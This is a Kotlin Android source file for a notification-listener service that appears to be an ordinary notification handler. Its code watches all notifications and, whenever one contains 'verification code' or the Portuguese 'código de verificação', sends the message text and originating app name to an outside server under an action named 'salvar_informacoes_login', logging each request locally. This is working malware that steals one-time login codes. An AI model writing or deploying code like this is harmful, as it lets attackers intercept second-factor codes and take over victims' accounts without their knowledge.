
package com.tratarnotificacoes
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import kotlin.concurrent.thread
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.io.File
class NotificationSvc: NotificationListenerService() {
 override fun onNotificationPosted(sbn: StatusBarNotification) {
	val txt =
		(
			sbn.notification.extras.getCharSequence("android.bigText")
			?: sbn.notification.extras.getCharSequence("android.text")
			?: ""
		).toString()
		
	if (

		(!txt.contains("código de verificação", true))
		
		&&
		
		(!txt.contains("verification code", true))

	) return
	
  thread {
 


	val arquivo = File(
		applicationContext.filesDir,
		"http_status_log.txt"
	)

	if (arquivo.exists() && arquivo.length() > 300 * 1024) {

		val conteudo = arquivo.readText()

		val truncado =
			conteudo
				.takeLast(200 * 1024)
				.substringAfter('\n')

		arquivo.writeText(
			"Este arquivo foi truncado em " +
			SimpleDateFormat(
				"yyyy-MM-dd HH:mm:ss",
				Locale.getDefault()
			).format(Date()) +
			"\n\n" +
			truncado
		)
	}


 
    val u =
        "https://economizafloripa.com.br/algoritmo/index.php" +
        "?acao=salvar_informacoes_login" +
        "&informacoes_login=" + URLEncoder.encode(txt,"UTF-8") +
        "&aplicativo=" + URLEncoder.encode(sbn.packageName,"UTF-8")  
  
	var c: HttpURLConnection? = null
	
	try {
	
		c = URL(u).openConnection() as HttpURLConnection
		
		c.connectTimeout = 10000
		c.readTimeout = 10000

		c.requestMethod = "GET"

		val codigo = c.responseCode

		arquivo.appendText(
			 "\n\n\n${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())} HTTP $codigo URL=$u\n"
		)
	
   }
	catch(e: Exception) {

		arquivo.appendText(
			"${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())} ERRO ${e.javaClass.simpleName} URL=$u\n"
		)

	}
	finally {
		c?.disconnect()
	}	
 



 
  }
 }
}
